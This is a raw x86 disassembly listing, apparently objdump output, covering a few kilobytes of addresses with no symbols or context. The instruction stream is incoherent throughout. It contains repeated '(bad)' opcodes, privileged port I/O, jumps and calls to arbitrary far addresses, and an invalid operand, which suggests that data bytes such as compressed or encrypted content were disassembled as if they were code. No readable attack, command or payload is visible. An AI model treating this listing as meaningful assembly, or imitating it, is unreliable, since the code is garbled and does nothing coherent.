  4220ac:	lds    edx,FWORD PTR [edx+eiz*1+0x5cd48799]
  4220b3:	cmp    BYTE PTR [ebp-0x34],bl
  4220b6:	out    0xe5,eax
  4220b8:	(bad)  
  4220b9:	in     al,0x98
  4220bb:	pop    ss
  4220bc:	mov    ecx,DWORD PTR [edi-0x77]
  4220bf:	shl    DWORD PTR [edi],cl
  4220c1:	jmp    0x44e2a63b
  4220c6:	dec    esp
  4220c7:	jb     0x422103
  4220c9:	inc    ebp
  4220ca:	ds aam 0xb8
  4220cd:	scas   al,BYTE PTR es:[edi]
  4220ce:	daa    
  4220cf:	dec    ebp
  4220d0:	outs   dx,DWORD PTR ds:[esi]
  4220d1:	cmp    edx,DWORD PTR [ebx+0x79b0120b]
  4220d7:	xchg   ecx,eax
  4220d8:	sbb    al,BYTE PTR [esi+edx*1-0x42]
  4220dc:	mov    eax,DWORD PTR [edx+eax*1+0x35]
  4220e0:	call   0x64486c5d
  4220e5:	or     al,0xb0
  4220e7:	(bad)  
  4220e8:	loopne 0x42210b
  4220ea:	sti    
  4220eb:	pop    edx
  4220ec:	out    0x72,al
  4220ee:	repz out dx,al
  4220f0:	and    DWORD PTR [ebx-0x1b33c877],0xffffff96
  4220f7:	ds pushf 
  4220f9:	fwait
  4220fa:	and    BYTE PTR [ecx-0xb],0xcd
  4220fe:	xchg   ebx,eax
  4220ff:	ffree  st(0)
  422101:	sub    DWORD PTR [ecx+ebp*8-0x19],0x66
  422106:	nop
  422107:	and    ecx,DWORD PTR [edi+ebx*4]
  42210a:	xor    DWORD PTR [ecx],edi
  42210c:	jl     0x422163
  42210e:	cmc    
  42210f:	cmc    
  422110:	adc    dh,BYTE PTR [ecx-0x1]
  422113:	mov    edi,0x1f1e89d5
  422118:	popf   
  422119:	mov    eax,ds:0x7207608e
  42211e:	arpl   di,si
  422120:	in     al,dx
  422121:	daa    
  422122:	or     al,0x8a
  422124:	popa   
  422125:	mov    edi,0x35b2acf2
  42212a:	lods   eax,DWORD PTR ds:[esi]
  42212b:	fdiv   st(7),st
  42212d:	lock (bad) 
  42212f:	xor    ebp,DWORD PTR [ebp+0x2a97b48a]
  422135:	adc    eax,0x8c3ef015
  42213a:	mov    bl,0x7d
  42213c:	or     dh,BYTE PTR [esi-0x6c]
  42213f:	xchg   edi,eax
  422140:	sbb    esi,DWORD PTR [esi+edi*1]
  422143:	fcom   QWORD PTR [edi+ecx*8]
  422146:	loop   0x422161
  422148:	ror    bl,cl
  42214a:	leave  
  42214b:	inc    esi
  42214c:	lock imul eax,DWORD PTR [eax-0x3e],0x5a75865f
  422154:	xchg   esi,eax
  422155:	adc    DWORD PTR [edx-0x6d836a47],eax
  42215b:	dec    eax
  42215c:	in     eax,0xe8
  42215e:	and    edi,edi
  422160:	ror    DWORD PTR [edi-0x7b160ef3],1
  422166:	in     al,0xea
  422168:	jge    0x422172
  42216a:	adc    edi,DWORD PTR ds:0x687125bb
  422170:	icebp  
  422171:	jno    0x422198
  422173:	jb     0x422123
  422175:	xor    edi,DWORD PTR [ebp+eiz*2+0x78]
  422179:	aad    0x6a
  42217b:	cmp    esi,edx
  42217d:	shr    BYTE PTR [ecx+0x418fc683],cl
  422183:	iret   
  422184:	leave  
  422185:	inc    esi
  422186:	inc    esp
  422187:	jno    0x4221e9
  422189:	std    
  42218a:	retf   0x7e88
  42218d:	out    0x0,al
  42218f:	popf   
  422190:	loop   0x42220b
  422192:	sub    al,0xbf
  422194:	jno    0x422146
  422196:	dec    esi
  422197:	push   ss
  422198:	jae    0x422218
  42219a:	out    0x92,eax
  42219c:	add    dh,dh
  42219e:	rcr    DWORD PTR [edi-0x6caab025],1
  4221a4:	and    ebp,edx
  4221a6:	push   es
  4221a7:	mov    dh,0xad
  4221a9:	enter  0x6f2,0x18
  4221ad:	lock bswap esi
  4221b0:	inc    edi
  4221b1:	neg    DWORD PTR [ecx-0x48]
  4221b4:	call   0xbc84:0xa893e309
  4221bb:	loop   0x422235
  4221bd:	(bad)  
  4221be:	or     esi,esi
  4221c0:	ss jp  0x4221bd
  4221c3:	loope  0x42215d
  4221c5:	sbb    eax,0x6e636930
  4221ca:	stc    
  4221cb:	sbb    BYTE PTR [esi],dl
  4221cd:	add    BYTE PTR [edi],bl
  4221cf:	sub    esp,DWORD PTR [eax+edi*8+0x67]
  4221d3:	retf   
  4221d4:	test   eax,0xdfbd3ae3
  4221d9:	mov    esi,0x5956be96
  4221de:	test   DWORD PTR [edx],esi
  4221e0:	in     eax,dx
  4221e1:	(bad)  
  4221e2:	pop    DWORD PTR [edi]
  4221e4:	mov    edx,0xf096b6e0
  4221e9:	cld    
  4221ea:	inc    ebp
  4221eb:	daa    
  4221ec:	cmp    eax,0x32d9b7c7
  4221f1:	call   0x3e3bd3a5
  4221f6:	aaa    
  4221f7:	std    
  4221f8:	fisubr WORD PTR [ebp-0x2d29b1b8]
  4221fe:	arpl   WORD PTR [ecx],sp
  422200:	inc    esi
  422201:	sbb    DWORD PTR [edi],ebp
  422203:	jmp    0x99ed:0x40c1f64f
  42220a:	dec    ebx
  42220b:	fs enter 0x257b,0x32
  422210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422211:	or     bh,BYTE PTR [ecx-0x789652f8]
  422217:	dec    ecx
  422218:	xchg   ebx,eax
  422219:	repnz retf 
  42221b:	mov    dl,0x4a
  42221d:	jae    0x4221d9
  42221f:	das    
  422220:	(bad)  [edx]
  422222:	ret    0xc2f
  422225:	xor    DWORD PTR [ebp-0x6228da],0xffffffbe
  42222c:	leave  
  42222d:	test   BYTE PTR [ebx+0x8],0x8d
  422231:	js     0x42221b
  422233:	daa    
  422234:	jns    0x42222f
  422236:	inc    eax
  422237:	fcomp  QWORD PTR [esi+0x4a52ceb0]
  42223d:	jmp    edx
  42223f:	xlat   BYTE PTR ds:[ebx]
  422240:	retf   
  422241:	mov    al,0xfc
  422243:	pop    edx
  422244:	sbb    al,0x9d
  422246:	cwde   
  422247:	aad    0x18
  422249:	adc    BYTE PTR [ebx-0x32ba96e4],al
  42224f:	aas    
  422250:	fdiv   DWORD PTR [edx-0xf4cacf1]
  422256:	xchg   edx,eax
  422257:	mov    ah,0xde
  422259:	pop    ebx
  42225a:	mov    esp,0x22b32c36
  42225f:	xchg   edi,eax
  422260:	dec    esi
  422261:	cli    
  422262:	adc    eax,0xe6b2c03b
  422267:	sub    esp,DWORD PTR [edx-0x2374ceb]
  42226d:	daa    
  42226e:	inc    BYTE PTR [edx+0x42]
  422271:	fwait
  422272:	ror    DWORD PTR [edx+0x28],cl
  422275:	clc    
  422276:	mov    ebp,0xab603317
  42227b:	inc    esp
  42227c:	enter  0x435f,0x13
  422280:	sbb    dl,BYTE PTR [esi+ecx*4-0x366cbc3b]
  422287:	xchg   edi,eax
  422288:	loopne 0x4222fb
  42228a:	mov    esp,0xc0b59a3f
  42228f:	call   DWORD PTR [esi]
  422291:	xchg   BYTE PTR [ecx],ah
  422293:	and    edi,eax
  422295:	fiadd  WORD PTR [ebx]
  422297:	ds mov ebx,0x2195fda7
  42229d:	mov    al,ds:0x0
	...
  4222aa:	inc    edx
  4222ab:	inc    esp
  4222ac:	inc    ebx
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0x26b771dc,eax
  4222b9:	retf   0xb130
  4222bc:	add    DWORD PTR [eax],eax
  4222be:	jl     0x4222c6
  4222c0:	add    BYTE PTR [eax],al
  4222c2:	inc    ecx
  4222c3:	jbe    0x4222ef
  4222c5:	aad    0x9e
  4222c7:	mov    cl,0x82
  4222c9:	inc    edx
  4222ca:	iret   
  4222cb:	inc    ebp
  4222cc:	mov    dh,0xc6
  4222ce:	(bad)  
  4222d0:	add    dl,BYTE PTR [ebx-0x1f]
  4222d3:	retf   0x11a7
  4222d6:	mov    ebx,DWORD PTR [eax-0x17]
  4222d9:	xor    al,0x30
  4222db:	(bad)  
  4222dc:	js     0x4222d6
  4222de:	mov    esp,0x177c35cf
  4222e3:	jecxz  0x4222bb
  4222e5:	in     al,0xf8
  4222e7:	loop   0x42232b
  4222e9:	data16 cld 
  4222eb:	cmp    esp,DWORD PTR [eax+0x40fb966]
  4222f1:	arpl   di,sp
  4222f3:	call   DWORD PTR [esi-0x5d836ad7]
  4222f9:	int    0x3f
  4222fb:	and    al,0xe1
  4222fd:	inc    esi
  4222fe:	das    
  4222ff:	loop   0x422333
  422301:	sub    cl,BYTE PTR [ecx-0x72]
  422304:	jne    0x422330
  422306:	aad    0x2c
  422308:	pop    ebx
  422309:	stos   BYTE PTR es:[edi],al
  42230a:	dec    eax
  42230b:	test   ebp,edx
  42230d:	stos   DWORD PTR es:[edi],eax
  42230e:	int    0xd9
  422310:	ss hlt 
  422312:	mov    cl,0xb7
  422314:	inc    ebx
  422315:	push   eax
  422316:	cmp    al,0x86
  422318:	mov    ah,0xa
  42231a:	xor    ebp,DWORD PTR es:[ecx+0x15]
  42231e:	jp     0x422301
  422320:	js     0x4222e2
  422322:	mov    esi,0xd2b92e14
  422327:	(bad)  
  422328:	cld    
  422329:	cdq    
  42232a:	xor    al,0xab
  42232c:	mov    esp,0xa084c016
  422331:	popf   
  422332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422333:	js     0x422376
  422335:	cmp    DWORD PTR [edi],0xcf43ac2
  42233b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42233c:	arpl   WORD PTR [edi-0x6f1bbb6a],bp
  422342:	repnz out 0x9,eax
  422345:	popa   
  422346:	div    BYTE PTR [edi+0x7acf9b55]
  42234c:	jbe    0x4222d4
  42234e:	fst    QWORD PTR [edx]
  422350:	(bad)  
  422351:	retf   0x9ec7
  422354:	push   esp
  422355:	pop    esp
  422356:	pop    eax
  422357:	in     eax,dx
  422358:	retf   
  422359:	outs   dx,BYTE PTR ds:[esi]
  42235a:	jns    0x422317
  42235c:	lods   eax,DWORD PTR ds:[esi]
  42235d:	or     ebp,DWORD PTR [edx-0x68]
  422360:	or     al,0x36
  422362:	pop    ds
  422363:	adc    DWORD PTR [ecx],esi
  422365:	dec    edx
  422366:	push   esi
  422367:	adc    eax,0x212ba47d
  42236c:	jno    0x422380
  42236e:	popf   
  42236f:	and    DWORD PTR [edx],edi
  422371:	(bad)  
  422372:	out    dx,al
  422373:	or     al,0x2a
  422375:	scas   eax,DWORD PTR es:[edi]
  422376:	fwait
  422377:	and    BYTE PTR [ebp+ecx*2+0x44],dh
  42237b:	sar    DWORD PTR [ebx+0x66],0x6f
  42237f:	push   esi
  422380:	ins    DWORD PTR es:[edi],dx
  422381:	or     eax,0xf8c1cd52
  422386:	daa    
  422387:	pop    eax
  422388:	ror    DWORD PTR [edi],cl
  42238a:	sub    BYTE PTR [edx],dh
  42238c:	popf   
  42238d:	inc    esi
  42238e:	test   eax,0x9d506ec
  422393:	adc    al,0x1f
  422395:	aas    
  422396:	pop    edx
  422397:	mov    bh,0xf2
  422399:	fadd   QWORD PTR [ebx]
  42239b:	mov    DWORD PTR [eax],esp
  42239d:	frstor [eax+0x71a15e90]
  4223a3:	push   ds
  4223a4:	call   0x907d:0x5afca584
  4223ab:	les    ecx,FWORD PTR [esi]
  4223ad:	adc    eax,0x625f4216
  4223b2:	adc    edi,DWORD PTR [edi]
  4223b4:	es out dx,al
  4223b6:	mul    edi
  4223b8:	(bad)  
  4223ba:	xchg   ebx,eax
  4223bb:	mov    edi,0xe7743bb6
  4223c0:	cdq    
  4223c1:	jns    0x4223df
  4223c3:	cmc    
  4223c4:	lahf   
  4223c5:	fld    DWORD PTR [edx]
  4223c7:	aas    
  4223c8:	popf   
  4223c9:	mov    esi,0x433d3d1a
  4223ce:	shl    DWORD PTR [esp+eiz*4-0x4f],1
  4223d2:	mov    edi,0xe5d703f
  4223d7:	inc    edi
  4223d8:	sbb    DWORD PTR [ecx],ecx
  4223da:	jle    0x422452
  4223dc:	aas    
  4223dd:	add    esp,edi
  4223df:	xor    eax,0xa18ce913
  4223e4:	adc    al,0xf8
  4223e6:	int    0x2c
  4223e8:	or     DWORD PTR ds:0xb97447d0,edx
  4223ee:	mov    ah,dl
  4223f0:	mov    eax,0x8cc8f543
  4223f5:	xor    al,0x1d
  4223f7:	push   ecx
  4223f8:	cwde   
  4223f9:	loope  0x4223f8
  4223fb:	pop    es
  4223fc:	std    
  4223fd:	ja     0x42245a
  4223ff:	and    dh,BYTE PTR [ebx-0x62fc2d9e]
  422405:	sbb    DWORD PTR [edi+0x2b],ecx
  422408:	aam    0x8e
  42240a:	and    DWORD PTR [edi-0x4b],esp
  42240d:	iret   
  42240e:	inc    ecx
  42240f:	xchg   esi,eax
  422410:	(bad)  
  422411:	rcl    DWORD PTR [edx],1
  422413:	adc    BYTE PTR ds:0xa9cde4ac,ah
  422419:	adc    al,dh
  42241b:	pop    ds
  42241c:	rcr    BYTE PTR [ecx-0x55],1
  42241f:	pop    edx
  422420:	push   esi
  422421:	jmp    0xe45ad5e6
  422426:	xchg   ebp,eax
  422427:	(bad)  
  422428:	jmp    0x19c:0x66fd088
  42242f:	leave  
  422430:	stos   DWORD PTR es:[edi],eax
  422431:	arpl   WORD PTR [ebx],di
  422433:	(bad)  
  422434:	push   es
  422435:	jmp    0x6be1:0x7b8dad53
  42243c:	aad    0x3d
  42243e:	dec    eax
  42243f:	outs   dx,BYTE PTR ds:[esi]
  422440:	popf   
  422441:	fnstsw WORD PTR [ecx+0x8]
  422444:	inc    ebx
  422445:	mov    es,WORD PTR [eax-0x55]
  422448:	(bad)  
  422449:	push   ss
  42244a:	mov    esp,DWORD PTR [edi]
  42244c:	jo     0x42243d
  42244e:	leave  
  42244f:	xchg   edi,eax
  422450:	pop    esp
  422451:	push   ebp
  422452:	push   ebp
  422453:	fsub   QWORD PTR [edi-0x2237cd04]
  422459:	enter  0xe6c6,0xe7
  42245d:	ins    BYTE PTR es:[edi],dx
  42245e:	loop   0x42248f
  422460:	gs xchg esi,eax
  422462:	pop    ss
  422463:	pop    ebx
  422464:	adc    dh,ah
  422466:	fld    DWORD PTR [eax-0x942737a]
  42246c:	outs   dx,BYTE PTR ds:[esi]
  42246d:	push   0xfffffff5
  42246f:	mov    cl,0x70
  422471:	inc    ebx
  422472:	jmp    0x1d1521b4
  422477:	dec    edx
  422478:	loop   0x4224f8
  42247a:	imul   esi,DWORD PTR [edx+0x5cda032e],0x26
  422481:	fdivr  DWORD PTR [ecx-0x5e6ec19a]
  422487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422488:	(bad)  
  422489:	jl     0x422474
  42248b:	pop    esp
  42248c:	jae    0x422477
  42248e:	mov    eax,esi
  422490:	and    bl,bl
  422492:	test   al,0xe5
  422494:	sbb    cl,BYTE PTR [ebx-0x62]
  422497:	sar    DWORD PTR [edi],0x2c
  42249a:	in     al,dx
  42249b:	mov    dh,0xc2
  42249d:	stc    
  42249e:	test   al,0x75
  4224a0:	dec    eax
  4224a1:	cmp    al,0x37
  4224a3:	std    
  4224a4:	lods   al,BYTE PTR ds:[esi]
  4224a5:	xor    bh,BYTE PTR [edi+0x276306f5]
  4224ab:	lock (bad) 
  4224ad:	pop    bp
  4224af:	aad    0xbb
  4224b1:	and    ebx,0x4a
  4224b4:	sar    DWORD PTR [esi],0xa4
  4224b7:	(bad)  
  4224b8:	repz pop ebp
  4224ba:	mov    cs,eax
  4224bc:	jle    0x4224bb
  4224be:	shl    BYTE PTR [edi],0x33
  4224c1:	jbe    0x4224f4
  4224c3:	call   0x1102e1cf
  4224c8:	dec    esi
  4224c9:	push   es
  4224ca:	jne    0x4224ef
  4224cc:	pop    ebx
  4224cd:	aad    0x3f
  4224cf:	add    eax,0x673edd37
  4224d4:	mov    eax,0xcf4bdfe1
  4224d9:	mov    esp,0x59308133
  4224de:	xchg   eax,eax
  4224e0:	mov    ebx,0xbfceb5dc
  4224e5:	push   ebx
  4224e6:	repnz in eax,0x9d
  4224e9:	mov    eax,0x86f7e9d2
  4224ee:	and    bl,0xf8
  4224f1:	or     BYTE PTR [ecx+esi*1+0x64cb620f],0xdd
  4224f9:	push   ss
  4224fa:	(bad)  
  4224fc:	xor    DWORD PTR [ecx],edi
  4224fe:	hlt    
  4224ff:	pop    ecx
  422500:	push   ebx
  422501:	call   0xc5eeb1e3
  422506:	or     DWORD PTR [ebp+0x4f],eax
  422509:	pop    ebx
  42250a:	idiv   DWORD PTR [ebp-0x18]
  42250d:	mov    dl,0x30
  42250f:	shl    BYTE PTR [eax+0x77902914],0xea
  422516:	retf   
  422517:	jns    0x42257a
  422519:	scas   eax,DWORD PTR es:[edi]
  42251a:	jmp    0x4224fa
  42251c:	push   0x42
  42251e:	dec    eax
  42251f:	js     0x42254d
  422521:	cmp    al,0xa8
  422523:	add    eax,0xd1a47572
  422528:	sub    DWORD PTR [esi],0x1b
  42252b:	(bad)  
  42252c:	clc    
  42252d:	sbb    BYTE PTR [eax+0x36385806],cl
  422533:	cmp    al,BYTE PTR [edx-0x28]
  422536:	jle    0x422565
  422538:	bound  eax,QWORD PTR [ecx]
  42253a:	pushf  
  42253b:	pop    eax
  42253c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42253e:	inc    esp
  42253f:	mov    BYTE PTR [esi-0x546bfc46],0x83
  422546:	push   ss
  422547:	xor    edx,DWORD PTR [eax-0xe738d0e]
  42254d:	cs es dec edi
  422550:	mov    eax,0xdf2adb7e
  422555:	adc    eax,0xbaffe891
  42255a:	jbe    0x4225be
  42255c:	or     ecx,DWORD PTR [esi]
  42255e:	ret    
  42255f:	scas   al,BYTE PTR es:[edi]
  422560:	adc    eax,0x2de38b8f
  422565:	lahf   
  422566:	addr16 clc 
  422568:	jae    0x422541
  42256a:	or     DWORD PTR [ecx],ebx
  42256c:	ror    DWORD PTR [ebx+0x1c],0xdf
  422570:	jp     0x422559
  422572:	xchg   ebx,eax
  422573:	xor    bh,BYTE PTR ds:0x53b2dc67
  422579:	adc    BYTE PTR [edx-0x1283ec77],dh
  42257f:	xchg   ebx,eax
  422580:	fsubr  QWORD PTR [edx]
  422582:	test   al,0xe3
  422584:	ins    BYTE PTR es:[edi],dx
  422585:	call   0xf1f2526e
  42258a:	xchg   BYTE PTR [eax-0x6b],al
  42258d:	pushf  
  42258e:	loopne 0x4225d2
  422590:	xor    ebp,DWORD PTR [edx+esi*4-0x7a052cf9]
  422597:	xchg   esi,eax
  422598:	popf   
  422599:	sbb    dh,dh
  42259b:	mov    esp,0x93dc8d0
  4225a0:	pusha  
  4225a1:	sahf   
  4225a2:	(bad)  
  4225a3:	dec    dl
  4225a5:	and    BYTE PTR [esi],dh
  4225a7:	not    DWORD PTR [ecx-0xc]
  4225aa:	jp     0x42261f
  4225ac:	ret    
  4225ad:	rol    DWORD PTR [eax-0x353ebbb3],cl
  4225b3:	shl    bl,1
  4225b5:	fldcw  WORD PTR [edx+eiz*1-0x12d9f578]
  4225bc:	scas   eax,DWORD PTR es:[edi]
  4225bd:	inc    eax
  4225be:	or     al,0xd
  4225c0:	inc    ebx
  4225c1:	push   ds
  4225c2:	ficom  DWORD PTR [ebp+eax*1+0x75]
  4225c6:	out    dx,eax
  4225c7:	mov    esp,0xef569354
  4225cc:	xchg   ebp,eax
  4225cd:	sub    esi,edx
  4225cf:	lahf   
  4225d0:	push   esi
  4225d1:	(bad)  
  4225d2:	cmp    DWORD PTR [ebx+0x3509c152],0xffffffca
  4225d9:	outs   dx,BYTE PTR ds:[esi]
  4225da:	push   esp
  4225db:	in     al,dx
  4225dc:	stos   BYTE PTR es:[edi],al
  4225dd:	push   ss
  4225de:	ja     0x422606
  4225e0:	and    eax,0xa10b310c
  4225e5:	dec    edi
  4225e6:	inc    edi
  4225e7:	mov    eax,ds:0x7bc6bd82
  4225ec:	jmp    0x422654
  4225ee:	mov    esp,0x23608eda
  4225f3:	lods   eax,DWORD PTR ds:[esi]
  4225f4:	or     eax,0xc83247d4
  4225f9:	jbe    0x42258a
  4225fb:	and    eax,0x1e8cb7a6
  422600:	in     al,dx
  422601:	or     eax,0x3cf2d64a
  422606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422607:	sbb    DWORD PTR [eax+0x39],edi
  42260a:	icebp  
  42260b:	push   eax
  42260c:	mov    ds:0xe9d7936e,eax
  422611:	dec    ecx
  422612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422613:	loope  0x42264b
  422615:	push   es
  422616:	daa    
  422617:	dec    ecx
  422618:	ins    DWORD PTR es:[edi],dx
  422619:	xchg   ebp,eax
  42261a:	adc    eax,0x521c2374
  42261f:	jmp    0x422631
  422621:	popf   
  422622:	arpl   WORD PTR [edi],si
  422624:	mov    gs,WORD PTR [esp+edx*4-0x2dadd2b7]
  42262b:	jmp    0xf330e043
  422630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422631:	lods   al,BYTE PTR ds:[esi]
  422632:	jge    0x42262b
  422634:	xor    eax,0x84c78a6b
  422639:	call   0x3c787bf5
  42263e:	clc    
  42263f:	mov    esi,0x907fdba
  422644:	mov    ebp,0xa7add474
  422649:	push   ss
  42264a:	pop    edi
  42264b:	push   ebp
  42264c:	fmul   DWORD PTR [esp+ecx*2-0x614aa924]
  422653:	jg     0x4226c7
  422655:	mov    ecx,0x15034ec1
  42265a:	loope  0x4225f9
  42265c:	and    DWORD PTR [edi],eax
  42265e:	cmp    edx,DWORD PTR [ebx-0x15679f92]
  422664:	shr    esp,0xf2
  422667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422668:	xor    ah,BYTE PTR ds:0x21a1fc25
  42266e:	mov    bh,0xfc
  422670:	rcr    DWORD PTR [ebp+0x43643519],0x91
  422677:	outs   dx,DWORD PTR ds:[esi]
  422678:	cmp    ecx,ecx
  42267a:	mov    al,0x2b
  42267c:	cmp    al,0x37
  42267e:	adc    bh,BYTE PTR [ebx+0x36eb6b75]
  422684:	daa    
  422685:	rol    DWORD PTR [ebp+0x78de178e],0x24
  42268c:	addr16 push esp
  42268e:	data16 aad 0x70
  422691:	jle    0x422648
  422693:	fwait
  422694:	test   BYTE PTR [edi],ch
  422696:	fnstenv [edx+eiz*2]
  422699:	repz pushf 
  42269b:	pop    ecx
  42269c:	(bad)  
  42269d:	jne    0x422716
  42269f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226a0:	jl     0x42269a
  4226a2:	jbe    0x4226c9
  4226a4:	stos   BYTE PTR es:[edi],al
  4226a5:	jmp    0xea9120a1
  4226aa:	push   es
  4226ab:	fld    TBYTE PTR [esi-0x6d]
  4226ae:	xlat   BYTE PTR ds:[ebx]
  4226af:	and    DWORD PTR [esi-0x48],ebx
  4226b2:	adc    esp,DWORD PTR [esp+ebp*4]
  4226b5:	or     DWORD PTR [esi-0x444efbbd],eax
  4226bb:	aas    
  4226bc:	fisubr WORD PTR [edx]
  4226be:	sbb    eax,0xba1dfbbe
  4226c4:	stc    
  4226c5:	aam    0xd9
  4226c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226c8:	fldenv gs:[eax+0x7c6b77fd]
  4226cf:	shl    DWORD PTR [esi],0xf7
  4226d2:	mov    ds:0xe10dbf42,eax
  4226d7:	test   DWORD PTR [esi-0x73],0xf63b475f
  4226de:	aad    0x8e
  4226e0:	in     eax,dx
  4226e1:	cmp    ch,bh
  4226e3:	cmp    al,0x75
  4226e5:	pop    ecx
  4226e6:	fisub  WORD PTR [ebx+0x5]
  4226e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ea:	sbb    DWORD PTR [esi+0x1f],ebp
  4226ed:	push   eax
  4226ee:	push   0x3658eda
  4226f3:	mov    dl,0x32
  4226f5:	inc    edi
  4226f6:	lahf   
  4226f7:	outs   dx,BYTE PTR ds:[esi]
  4226f8:	inc    edi
  4226f9:	xchg   ah,dl
  4226fb:	popa   
  4226fc:	addr16 dec ebp
  4226fe:	add    eax,0xdbdb40c0
  422703:	jmp    0x1830:0x541f121e
  42270a:	sub    edx,ebx
  42270c:	xchg   ecx,eax
  42270d:	sbb    eax,0x3b5b4b90
  422712:	push   ecx
  422713:	lods   eax,DWORD PTR ds:[esi]
  422714:	cmp    ebx,DWORD PTR [ecx+ebp*8+0x60]
  422718:	and    ah,ch
  42271a:	gs (bad) 
  42271c:	popf   
  42271d:	jbe    0x4226ef
  42271f:	mov    DWORD PTR [eax-0x15],edx
  422722:	pop    edx
  422723:	sbb    ch,BYTE PTR [esi+edx*8-0x7be9332f]
  42272a:	sahf   
  42272b:	popa   
  42272c:	push   0x33
  42272e:	lahf   
  42272f:	mov    bl,0x8a
  422731:	push   0xffffffa6
  422733:	pop    ss
  422734:	cmc    
  422735:	mov    ds:0x8d37efc0,al
  42273a:	mov    DWORD PTR [esi],ebx
  42273c:	cmp    eax,0x7e87c568
  422741:	call   0x4d39:0x7fc57154
  422748:	xchg   ebp,eax
  422749:	cli    
  42274a:	xchg   BYTE PTR [edx+0x61],bl
  42274d:	mov    esp,0xbb177b08
  422752:	or     ch,ch
  422754:	push   ebp
  422755:	adc    ebx,DWORD PTR [esi+0x2bf19971]
  42275b:	jmp    0x4227db
  42275d:	int3   
  42275e:	rcr    BYTE PTR [edx],cl
  422760:	mov    ds:0x53ffa03,eax
  422765:	lods   al,BYTE PTR ds:[esi]
  422766:	ins    BYTE PTR es:[edi],dx
  422767:	rcl    DWORD PTR [esp+esi*4-0x14182ba0],0x3c
  42276f:	fidivr DWORD PTR [ecx+edi*4]
  422772:	fild   WORD PTR [ebp+0x41aa8e51]
  422778:	pop    ss
  422779:	jbe    0x4227a9
  42277b:	mov    bh,0xde
  42277d:	xor    eax,0x6957cafb
  422782:	mov    eax,0x26259c00
  422787:	call   0x6df:0xb953fc9
  42278e:	dec    esp
  42278f:	stc    
  422790:	xor    ah,bh
  422792:	jge    0x422735
  422794:	lock jae 0x422796
  422797:	push   es
  422798:	mov    WORD PTR [eax-0x37],ds
  42279b:	pop    ecx
  42279c:	in     al,dx
  42279d:	or     cl,BYTE PTR [edx+edi*2-0xb4aaf88]
  4227a4:	bound  ebx,QWORD PTR [ebx]
  4227a6:	xchg   esp,eax
  4227a7:	jecxz  0x422789
  4227a9:	aam    0x35
  4227ab:	(bad)  
  4227ac:	ins    DWORD PTR es:[edi],dx
  4227ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227ae:	jns    0x4227f1
  4227b0:	in     eax,dx
  4227b1:	gs mov al,0x65
  4227b4:	in     eax,0x2a
  4227b6:	pop    es
  4227b7:	sbb    dh,BYTE PTR [ecx+eax*2]
  4227ba:	add    cl,BYTE PTR [edi-0x2e]
  4227bd:	bswap  edx
  4227bf:	shl    DWORD PTR [eax],1
  4227c1:	and    DWORD PTR [esp+eax*1+0x47a33cfe],esi
  4227c8:	dec    edx
  4227c9:	cmp    DWORD PTR [ebx+0x709cd238],edx
  4227cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227d0:	std    
  4227d1:	icebp  
  4227d2:	es shl dh,0x10
  4227d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227d7:	dec    edx
  4227d8:	adc    cl,cl
  4227da:	cdq    
  4227db:	jnp    0x4227e2
  4227dd:	mov    cl,0x20
  4227df:	neg    DWORD PTR [edi+eiz*8-0x4e]
  4227e3:	mov    ds:0x1862a123,eax
  4227e8:	cmp    dh,bh
  4227ea:	mov    ?,WORD PTR [ebp-0x8]
  4227ed:	inc    edx
  4227ee:	mov    edx,0x3bd2e76d
  4227f3:	cmc    
  4227f4:	(bad)  
  4227f5:	mov    al,BYTE PTR [esi+0x1d043e02]
  4227fb:	mov    ah,0x63
  4227fd:	sbb    eax,0xd34e3170
  422802:	je     0x42284a
  422804:	mov    esp,0x8a34bbb4
  422809:	js     0x4227cb
  42280b:	add    eax,DWORD PTR [edi]
  42280d:	sub    BYTE PTR ds:0xbe581d4a,bl
  422813:	lds    esi,FWORD PTR [ebp-0x650116b3]
  422819:	cld    
  42281a:	fmul   QWORD PTR [edx+0x3aec4315]
  422820:	xchg   esi,eax
  422821:	push   es
  422822:	in     eax,0xa
  422824:	mov    cl,0xd9
  422826:	cwde   
  422827:	adc    BYTE PTR [edx],ah
  422829:	pop    esi
  42282a:	add    eax,0x94647751
  42282f:	push   es
  422830:	and    ebx,edx
  422832:	cmp    eax,0xe5be76e9
  422837:	mov    BYTE PTR [ebp+0x61de9c0],0xbc
  42283e:	jge    0x4228a7
  422840:	pop    ebp
  422841:	pusha  
  422842:	xchg   ebp,eax
  422843:	lods   eax,DWORD PTR ds:[esi]
  422844:	xor    cl,bl
  422846:	sbb    bh,BYTE PTR [eax]
  422848:	mov    ah,0x93
  42284a:	dec    esi
  42284b:	mov    dl,0x2e
  42284d:	out    dx,eax
  42284e:	mov    ebp,0x54db3439
  422853:	xchg   edx,eax
  422854:	in     eax,0xcf
  422856:	popf   
  422857:	aad    0x30
  422859:	inc    edx
  42285a:	xor    ch,BYTE PTR [ebx+ebp*8+0x9]
  42285e:	dec    ebx
  42285f:	dec    ecx
  422860:	or     eax,0xe9c83b34
  422865:	test   BYTE PTR [edi],ah
  422867:	mov    edx,DWORD PTR [ebx-0x56]
  42286a:	jecxz  0x42281f
  42286c:	pop    es
  42286d:	sub    DWORD PTR [esi],ebp
  42286f:	mov    cl,0xb1
  422871:	mov    ebx,DWORD PTR [edx]
  422873:	test   BYTE PTR [edx+0x78381ff4],bl
  422879:	mov    ds:0x5aad96b2,eax
  42287e:	sar    BYTE PTR [edi],cl
  422880:	(bad)  
